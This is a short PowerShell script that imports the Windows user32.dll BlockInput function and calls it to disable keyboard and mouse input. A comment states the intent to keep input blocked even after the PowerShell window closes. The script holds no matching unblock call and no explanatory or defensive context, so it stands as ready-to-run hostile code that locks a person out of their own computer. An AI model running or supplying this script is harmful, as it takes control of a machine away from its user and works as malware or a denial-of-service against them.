function Disable-UserInput {
  $jobName = "BlockUserInput"
    $blockInput = Add-Type -Name "UserInput" -PassThru -MemberDefinition @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

    # Persist blocking even if PowerShell window closes
    $blockInput::BlockInput($true)
}

Disable-UserInput | Out-Null
exit